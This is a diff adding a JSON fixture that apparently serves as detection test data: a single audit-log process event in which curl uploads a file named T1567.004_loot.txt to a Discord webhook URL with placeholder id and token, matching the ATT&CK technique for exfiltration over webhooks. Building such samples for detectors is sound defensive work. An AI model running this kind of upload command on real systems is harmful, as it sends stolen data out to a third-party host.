@@ -1,0 +1,10 @@
+[
+ {
+  "image": "/usr/bin/curl",
+  "commandLine": "curl -s -F file=@/tmp/T1567.004_loot.txt https://discord.com/api/webhooks/000000000000000000/token",
+  "source": "laurel",
+  "user": "1000",
+  "pid": 10110,
+  "ppid": 10000
+ }
+]
